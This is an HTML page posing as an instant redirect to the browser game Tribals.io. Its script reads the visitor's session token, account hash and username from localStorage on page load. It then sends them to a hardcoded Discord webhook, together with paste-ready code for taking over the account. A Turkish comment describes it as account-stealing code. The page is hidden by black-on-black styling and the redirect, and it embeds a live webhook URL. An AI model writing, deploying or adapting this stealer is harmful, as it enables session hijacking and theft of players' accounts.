<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta http-equiv="refresh" content="0;url=https://tribals.io">
    <title>Tribals.io</title>
    <style>body{background:#0a0a0a;color:#0a0a0a;}</style>
</head>
<body>
<!-- Hesap çalma kodu - tribals.io açılmadan önce çalışır, tarayıcıyı hazırlar -->
<script>
// Session'ı alıp Discord'a gönderen fonksiyon
const WEBHOOK = "https://discord.com/api/webhooks/1509236348479868940/ri6coZeLF0SF33bbZDLDFJsfdGE4H_01_v3MDD_B_6PwNJ4pxzrqwDgpfAEkyqkBUuxj";

// Session varsa gönder (kullanıcı daha önce giriş yapmışsa localStorage'ında kalır)
(function() {
    const s = localStorage.getItem('session');
    const h = localStorage.getItem('accountHash');
    const u = localStorage.getItem('userName') || 'Player';

    if (s) {
        const payload = "User: " + u + "\nSession: " + s + "\nHash: " + (h || "N/A") + 
                        "\n\nRestore kodu:\nlocalStorage.setItem('session', '" + s + "');\n" +
                        "localStorage.setItem('accountHash', '" + (h || "") + "');\nlocation.reload();";

        // Discord'a gönder (fetch ile)
        fetch(WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                embeds: [{
                    title: "📥 Tribals Session",
                    color: 0x8b0000,
                    fields: [
                        { name: "User", value: u, inline: true },
                        { name: "Data", value: "```" + payload + "```" }
                    ],
                    timestamp: new Date().toISOString()
                }]
            })
        }).catch(e => console.log(e));
    }
})();
</script>
</body>
</html>
